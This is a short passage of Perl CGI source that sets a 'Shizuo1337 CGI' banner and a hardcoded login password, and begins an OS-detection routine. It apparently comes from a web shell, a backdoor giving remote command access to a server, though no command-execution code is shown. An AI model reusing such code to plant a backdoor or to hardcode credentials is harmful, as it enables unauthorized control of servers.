...
$EditPersion="<font style='text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;'>Shizuo1337 CGI</font>";

$Password = "Lewster1337@$";         # Change this. You will need to enter this to login.
sub Is_Win(){
